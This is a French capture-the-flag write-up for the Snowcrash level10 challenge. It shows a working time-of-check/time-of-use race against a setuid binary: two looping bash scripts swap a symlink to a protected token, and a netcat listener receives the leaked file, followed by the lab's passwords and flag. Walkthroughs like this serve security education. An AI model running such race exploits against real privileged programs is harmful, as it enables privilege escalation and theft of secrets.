# Level10: Exploit spam access

> login:password -> *`level10:s5cAJpM8ev6XHw998pRWG728z`*
```
:~$ su level10
Password:s5cAJpM8ev6XHw998pRWG728z
```
---

```
:~$ pwd
/home/user/level10
```

```
:~$ ls -la
...
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
...
```

Le Home contient un binaire et un fichier token :

```
:~$ ./level10
./level10 file host
  sends file to host if you have access to it

:~$ ./level10 token localhost
You don't have access to token

:~$ ./level10 .profile localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

L'usage nous indique que le binaire envoi un fichier, mais uniquement si on possède les droits sur ce dernier.
En regardant du côté de la commande `strings level10` :

```
...
Connecting to %s:6969 ..
...
open
...
access
...
```

On remarque que le programme se connecte sur le port `:6969` et utilise `open` et `access`.\
Nous pouvons dés lors, profiter d'une faille d'access afin d'y récupérer le token (On profite du temps qu'il prends entre le check des droits et l'ouverture du fichier. man access).\
Pour ce faire nous allons utiliser 2 scripts qui utilise la technique du 'spam' :

- 1er script - Qui va essayer d'envoyer le fichier /tmp/link sur le localhost (ici `192.168.56.101`)
```
#!/bin/bash
while true;
do
	~/level10 /tmp/link 192.168.56.101
done
```

- 2e script - Qui va supprimer le fichier /tmp/link sur le localhost, le créer et y faire un lien symbolique avec le token présent sur le Home.
```
#!/bin/bash
while true;
do
	rm -f /tmp/link
	touch /tmp/link
	ln -fs ~/token /tmp/link
done
```

> Il est possible d'envoyer nos scripts directement dans notre user /tmp, grâce à la commande suivante :
> scp -P 4242 [file_name] level10@192.168.56.101:/tmp

```
:~$ pwd
[...]/snowcrash/level10/Ressources

:~$ ls
README.md  script1.sh script2.sh

:~$ scp -P 4242 script1.sh level10@192.168.56.101:/tmp
[...]
level10@192.168.56.101's password:
script1.sh // 100%   67   173.1KB/s   00:00

:~$ scp -P 4242 script2.sh level10@192.168.56.101:/tmp
[...]
level10@192.168.56.101's password:
script2.sh // 100%   67   173.1KB/s   00:00
```

Une fois les scripts téléchargés et lancés, il ne nous reste plus qu'à écouter les transfert avec la commande netcat `nc -lk` (`l` pour écouter & `k` pour conserver la connexion) sur le port de connexion `:6969`, pour obtenir le token.

```
:~$ nc -lk 6969
...
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
^C

```

Il nous suffit maintenant de nous connecter sur l'user `flag10` avec le résultat obtenu puis de lancer un `getflag`

```
:~$ su flag10
Password:woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !

:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

Le flag nous permet de se connecter au level11
`level11:feulo4b72j7edeahuete3no7c`